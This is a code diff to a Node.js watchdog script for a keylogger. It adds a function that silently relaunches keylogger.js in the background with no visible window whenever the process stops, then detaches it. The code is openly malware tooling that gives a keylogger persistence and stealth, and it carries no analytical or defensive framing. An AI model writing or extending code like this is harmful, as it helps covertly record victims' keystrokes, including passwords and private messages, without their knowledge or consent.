@@ -1,5 +1,6 @@
 const fs = require('fs');
 const { exec } = require('child_process');
+const path = require('path');
 
 let wasRunning = false; // Tracks if the keylogger was running in the last check
 
@@ -33,8 +34,36 @@ function checkKeyloggerStatus() {
       // Only log if the keylogger was previously running and has now stopped
       logToKeylogFile('Keylogger has stopped unexpectedly.');
       wasRunning = false; // Update the status to stopped
+      startKeylogger();
     }
   });
+}
+
+// Function to start the keylogger process
+function startKeylogger() {
+  logToKeylogFile('Starting keylogger...');
+    const keyloggerPath = path.join(__dirname, 'keylogger.js');
+
+    // Command to start the keylogger script directly without a visible window
+    const keyloggerCommand = `start "" /b node "${keyloggerPath}"`;
+
+    // Use 'exec' to start the keylogger
+    const keyloggerProcess = exec(keyloggerCommand);
+
+    // Handle potential error events when attempting to start the keylogger
+    keyloggerProcess.on('error', (error) => {
+      logToKeylogFile(`Failed to start keylogger process: ${error.message}`);
+      keyloggerRunning = false;
+    });
+
+    // Handle the 'spawn' event indicating successful startup of the keylogger
+    keyloggerProcess.on('spawn', () => {
+      logToKeylogFile('Keylogger started');
+      keyloggerRunning = true;
+    });
+
+    // Optionally, detach the processes if needed
+    keyloggerProcess.unref();
 }
 
 // Check the status every 5 seconds
